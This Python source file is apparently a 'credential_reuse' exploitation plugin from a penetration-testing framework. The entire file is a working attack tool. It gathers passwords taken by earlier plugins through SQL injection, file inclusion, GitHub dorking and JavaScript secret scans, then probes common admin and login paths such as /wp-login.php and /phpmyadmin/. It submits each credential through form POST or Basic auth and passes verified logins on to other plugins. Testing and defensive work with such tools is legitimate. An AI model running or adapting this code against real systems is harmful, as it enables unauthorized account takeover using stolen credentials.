"""Credential reuse attack — try discovered credentials on other endpoints."""

from __future__ import annotations

import logging
import re
from typing import Any, ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target
from basilisk.utils.http import resolve_base_urls

logger = logging.getLogger(__name__)

# Indicators of successful login
SUCCESS_INDICATORS = re.compile(
    r"(logout|dashboard|welcome|my.?account|profile|admin.?panel|"
    r"signed.?in|authenticated|success)",
    re.IGNORECASE,
)

# Indicators of failed login
FAILURE_INDICATORS = re.compile(
    r"(invalid|incorrect|wrong|failed|error|denied|unauthorized|"
    r"bad.?credentials|try.?again|not.?found)",
    re.IGNORECASE,
)

# Common admin panel paths to try credentials against
ADMIN_PATHS = [
    "/admin/login", "/admin", "/administrator",
    "/wp-login.php", "/wp-admin",
    "/user/login", "/login", "/signin",
    "/auth/login", "/account/login",
    "/panel", "/manager/html",
    "/phpmyadmin/", "/adminer.php",
]

# Common form field names for username/password
USERNAME_FIELDS = ["username", "user", "login", "email", "name", "user_login", "log"]
PASSWORD_FIELDS = ["password", "pass", "passwd", "pwd", "user_pass", "secret"]

# Max credential × target combinations to test
MAX_COMBINATIONS = 50


class CredentialReusePlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="credential_reuse",
        display_name="Credential Reuse",
        category=PluginCategory.EXPLOITATION,
        description="Try discovered credentials on login forms and admin panels",
        depends_on=[],
        produces=["successful_logins", "credentials"],
        timeout=90.0,
        risk_level="destructive",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(self.meta.name, target.host, error="HTTP client required")

        findings: list[Finding] = []
        data: dict[str, Any] = {"successful_logins": [], "tested": 0, "credentials": []}

        # Phase 1: Collect credentials from all sources
        credentials = self._collect_credentials(target, ctx)
        if not credentials:
            findings.append(Finding.info(
                "No credentials available for reuse testing",
                description="No creds found in ctx.state, pipeline, or credential store",
                tags=["credential-reuse"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        # Phase 2: Collect login targets
        login_targets = await self._collect_login_targets(target, ctx)
        if not login_targets:
            findings.append(Finding.info(
                f"No login endpoints found ({len(credentials)} credentials available)",
                tags=["credential-reuse"],
            ))
            return PluginResult.success(
                self.meta.name, target.host, findings=findings, data=data,
            )

        findings.append(Finding.info(
            f"Testing {len(credentials)} credentials against {len(login_targets)} endpoints",
            tags=["credential-reuse"],
        ))

        # Phase 3: Test each credential against each target
        tested = 0
        for login_target in login_targets:
            if ctx.should_stop:
                break
            for cred in credentials:
                if ctx.should_stop or tested >= MAX_COMBINATIONS:
                    break
                tested += 1
                success = await self._try_login(ctx, login_target, cred)
                if success:
                    login_info = {
                        "url": login_target["url"],
                        "username": cred.get("username", ""),
                        "method": login_target.get("method", "form"),
                    }
                    data["successful_logins"].append(login_info)
                    data["credentials"].append({
                        **cred,
                        "verified": "true",
                        "source": cred.get("source", "unknown") + ":reuse_verified",
                    })
                    findings.append(Finding.critical(
                        f"Credential Reuse: Login successful at {login_target['url']}",
                        evidence=(
                            f"URL: {login_target['url']}\n"
                            f"Username: {cred.get('username', 'N/A')}\n"
                            f"Method: {login_target.get('method', 'form')}\n"
                            f"Original source: {cred.get('source', 'unknown')}"
                        ),
                        description="Discovered credentials work on this login endpoint",
                        remediation=(
                            "Use unique passwords per service. "
                            "Implement account lockout and MFA."
                        ),
                        tags=["credential-reuse", "authentication"],
                        verified=True,
                    ))

        data["tested"] = tested

        # Feed verified credentials to shared state
        if data["credentials"]:
            creds = ctx.state.setdefault("credentials", [])
            creds.extend(data["credentials"])

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )

    def _collect_credentials(self, target: Target, ctx) -> list[dict[str, str]]:
        """Collect credentials from all available sources."""
        creds: list[dict[str, str]] = []
        seen: set[tuple[str, str]] = set()

        def _add(username: str, password: str, source: str) -> None:
            key = (username.lower(), password)
            if key not in seen and username and password:
                seen.add(key)
                creds.append({
                    "username": username,
                    "password": password,
                    "source": source,
                })

        # Source 1: ctx.state["credentials"] (from sqli_extract, lfi_harvest, etc.)
        for c in ctx.state.get("credentials", []):
            _add(c.get("username", ""), c.get("password", ""), c.get("source", "state"))

        # Source 2: CredentialStore
        if ctx.creds:
            try:
                for c in ctx.creds.all:
                    _add(
                        c.get("username", ""),
                        c.get("password", ""),
                        c.get("source", "cred_store"),
                    )
            except Exception:
                pass

        # Source 3: Pipeline results — default_creds plugin
        default_result = ctx.pipeline.get(f"default_creds:{target.host}")
        if default_result and default_result.ok:
            for c in default_result.data.get("credentials", []):
                _add(c.get("username", ""), c.get("password", ""), "default_creds")

        # Source 4: Pipeline results — js_secret_scan
        js_result = ctx.pipeline.get(f"js_secret_scan:{target.host}")
        if js_result and js_result.ok:
            for secret in js_result.data.get("secrets", []):
                if secret.get("type") in ("password", "api_key", "token"):
                    _add("admin", secret.get("value", ""), "js_secret_scan")

        # Source 5: Pipeline results — github_dorking
        gh_result = ctx.pipeline.get(f"github_dorking:{target.host}")
        if gh_result and gh_result.ok:
            for secret in gh_result.data.get("secrets", []):
                if "password" in secret.get("type", "").lower():
                    _add("admin", secret.get("value", ""), "github_dorking")

        return creds

    async def _collect_login_targets(
        self, target: Target, ctx,
    ) -> list[dict[str, Any]]:
        """Discover login endpoints to test credentials against."""
        targets: list[dict[str, Any]] = []
        seen_urls: set[str] = set()
        base_urls = await resolve_base_urls(target, ctx)
        base_url = base_urls[0] if base_urls else f"https://{target.host}"

        # Source 1: Discovered forms with password fields
        forms = ctx.state.get("discovered_forms", {}).get(target.host, [])
        for form in forms:
            inputs = form.get("inputs", {})
            if isinstance(inputs, dict):
                has_password = any("pass" in k.lower() for k in inputs)
            else:
                has_password = any(
                    isinstance(inp, dict) and inp.get("type") == "password"
                    for inp in inputs
                )
            if has_password:
                action = form.get("action", "")
                if action.startswith("http"):
                    url = action
                elif action.startswith("/"):
                    url = base_url + action
                else:
                    url = base_url + "/" + action
                if url not in seen_urls:
                    seen_urls.add(url)
                    targets.append({
                        "url": url,
                        "method": "form",
                        "form": form,
                    })

        # Source 2: Known admin paths
        for admin_path in ADMIN_PATHS:
            if ctx.should_stop:
                break
            url = base_url + admin_path
            if url in seen_urls:
                continue
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(url, timeout=8.0)
                    body = await resp.text(encoding="utf-8", errors="replace")
                if resp.status == 200 and self._has_login_form(body):
                    seen_urls.add(url)
                    targets.append({
                        "url": url,
                        "method": "form",
                        "form": self._parse_login_form(body),
                    })
            except Exception:
                continue

        # Source 3: Admin paths from pipeline state
        for admin_url in ctx.state.get("admin_paths", []):
            if admin_url not in seen_urls:
                seen_urls.add(admin_url)
                targets.append({"url": admin_url, "method": "form", "form": {}})

        return targets

    async def _try_login(
        self, ctx, login_target: dict, cred: dict[str, str],
    ) -> bool:
        """Attempt login with given credentials. Return True on success."""
        url = login_target["url"]
        method = login_target.get("method", "form")
        form = login_target.get("form", {})

        if method == "basic_auth":
            return await self._try_basic_auth(ctx, url, cred)

        return await self._try_form_login(ctx, url, form, cred)

    async def _try_form_login(
        self, ctx, url: str, form: dict, cred: dict[str, str],
    ) -> bool:
        """Try form-based login."""
        # Determine field names
        username_field = self._find_field(form, USERNAME_FIELDS, "username")
        password_field = self._find_field(form, PASSWORD_FIELDS, "password")

        post_data = {
            username_field: cred["username"],
            password_field: cred["password"],
        }

        # Add any hidden fields from the form
        inputs = form.get("inputs", {})
        if isinstance(inputs, dict):
            for k, v in inputs.items():
                if k not in post_data:
                    post_data[k] = v
        elif isinstance(inputs, list):
            for inp in inputs:
                if isinstance(inp, dict) and inp.get("type") == "hidden" and inp.get("name"):
                    post_data[inp["name"]] = inp.get("value", "")

        try:
            async with ctx.rate:
                resp = await ctx.http.post(url, data=post_data, timeout=10.0)
                body = await resp.text(encoding="utf-8", errors="replace")

            return self._is_login_successful(resp.status, body, resp.headers)
        except Exception:
            return False

    async def _try_basic_auth(
        self, ctx, url: str, cred: dict[str, str],
    ) -> bool:
        """Try HTTP Basic Authentication."""
        import base64

        auth_str = base64.b64encode(
            f"{cred['username']}:{cred['password']}".encode(),
        ).decode()
        headers = {"Authorization": f"Basic {auth_str}"}

        try:
            async with ctx.rate:
                resp = await ctx.http.get(url, headers=headers, timeout=10.0)
            return resp.status in (200, 301, 302) and resp.status != 401
        except Exception:
            return False

    def _is_login_successful(
        self, status: int, body: str, headers: Any,
    ) -> bool:
        """Determine if a login attempt was successful."""
        # Check for success indicators
        has_success = bool(SUCCESS_INDICATORS.search(body))
        has_failure = bool(FAILURE_INDICATORS.search(body))

        if has_failure and not has_success:
            return False
        if has_success and not has_failure:
            return True

        # 302 redirect to non-login page is often a success
        if status == 302:
            location = ""
            if hasattr(headers, "get"):
                location = headers.get("Location", "") or headers.get("location", "")
            if location and "login" not in location.lower():
                return True

        # New session cookie is a good sign
        set_cookie = ""
        if hasattr(headers, "get"):
            set_cookie = headers.get("Set-Cookie", "") or headers.get("set-cookie", "")
        return bool(
            set_cookie
            and ("session" in set_cookie.lower() or "token" in set_cookie.lower())
            and not has_failure
        )

    def _has_login_form(self, body: str) -> bool:
        """Check if page contains a login form."""
        return bool(
            re.search(r'<input[^>]*type=["\']password["\']', body, re.IGNORECASE)
            and re.search(r"<form", body, re.IGNORECASE)
        )

    def _parse_login_form(self, body: str) -> dict:
        """Parse a simple login form from HTML body."""
        inputs: list[dict[str, str]] = []
        for match in re.finditer(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']([^"\']+)["\']',
            body, re.IGNORECASE,
        ):
            inputs.append({"name": match.group(1), "type": match.group(2)})
        # Also match type before name
        for match in re.finditer(
            r'<input[^>]*type=["\']([^"\']+)["\'][^>]*name=["\']([^"\']+)["\']',
            body, re.IGNORECASE,
        ):
            inp = {"name": match.group(2), "type": match.group(1)}
            if not any(i["name"] == inp["name"] for i in inputs):
                inputs.append(inp)
        return {"inputs": inputs}

    def _find_field(
        self, form: dict, candidates: list[str], fallback: str,
    ) -> str:
        """Find the form field name matching a list of candidates."""
        inputs = form.get("inputs", {})
        if isinstance(inputs, dict):
            for inp_name in inputs:
                for cand in candidates:
                    if cand in inp_name.lower():
                        return inp_name
        elif isinstance(inputs, list):
            for inp in inputs:
                if not isinstance(inp, dict):
                    continue
                name = inp.get("name", "").lower()
                for cand in candidates:
                    if cand in name:
                        return inp["name"]
        return fallback
